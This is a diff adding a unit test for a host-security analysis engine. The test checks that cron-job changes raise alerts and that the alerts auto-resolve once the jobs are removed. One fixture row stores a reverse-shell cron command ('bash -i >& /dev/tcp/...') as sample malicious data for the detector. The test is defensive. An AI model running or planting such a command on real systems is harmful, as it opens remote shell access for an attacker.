@@ -232,5 +232,89 @@ class TestEngine(unittest.TestCase):
                 for r in rows:
                     self.assertEqual(r["resolved"], 1, f"Expected event {et} to be auto-resolved")
 
+    @patch("orin.analysis.engine.load_config")
+    def test_cron_rules_and_resolution(self, mock_load_config):
+        mock_load_config.return_value = {
+            "expected_ports": [22],
+            "whitelisted_processes": [],
+            "critical_paths": [],
+            "critical_dirs": []
+        }
+
+        # Step 1: Snapshot 1 with a benign cron
+        with self.storage.get_connection() as conn:
+            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
+            conn.execute(
+                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
+                "VALUES (1, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
+            )
+            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
+            conn.commit()
+
+        run_analysis_cycle(self.db_path)
+
+        # Verify no cron events in snapshot 1
+        with self.storage.get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT event_type FROM security_events WHERE event_type LIKE 'cron%' OR event_type = 'new_cron_job';")
+            self.assertEqual(len(cursor.fetchall()), 0)
+
+        # Step 2: Snapshot 2 with new crons (volatile execution, suspicious command, and drift)
+        with self.storage.get_connection() as conn:
+            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
+            # Benign cron remains
+            conn.execute(
+                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
+                "VALUES (2, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
+            )
+            # Volatile cron added
+            conn.execute(
+                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
+                "VALUES (2, '/var/spool/cron/crontabs/alice', 'alice', '* * * * *', '/tmp/backup.sh');"
+            )
+            # Suspicious cron command added
+            conn.execute(
+                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
+                "VALUES (2, '/etc/cron.d/shell', 'root', '* * * * *', 'bash -i >& /dev/tcp/1.1.1.1/4444');"
+            )
+            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
+            conn.commit()
+
+        run_analysis_cycle(self.db_path)
+
+        # Verify alerts triggered
+        with self.storage.get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT event_type, resolved FROM security_events WHERE resolved = 0;")
+            events = cursor.fetchall()
+            event_types = [e["event_type"] for e in events]
+            
+            self.assertEqual(len(events), 4)
+            self.assertEqual(event_types.count("new_cron_job"), 2)
+            self.assertEqual(event_types.count("cron_volatile_execution"), 1)
+            self.assertEqual(event_types.count("cron_suspicious_command"), 1)
+
+        # Step 3: Snapshot 3 with volatile & suspicious crons removed
+        with self.storage.get_connection() as conn:
+            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (3, 'debian', 'Linux');")
+            # Benign cron remains
+            conn.execute(
+                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
+                "VALUES (3, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
+            )
+            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (3, 'root', 0, 0);")
+            conn.commit()
+
+        run_analysis_cycle(self.db_path)
+
+        # Verify all those alerts are now resolved
+        with self.storage.get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("SELECT event_type, resolved FROM security_events WHERE event_type IN ('new_cron_job', 'cron_volatile_execution', 'cron_suspicious_command');")
+            events = cursor.fetchall()
+            self.assertEqual(len(events), 4)
+            for e in events:
+                self.assertEqual(e["resolved"], 1, f"Expected event {e['event_type']} to be auto-resolved")
+
 if __name__ == "__main__":
     unittest.main()
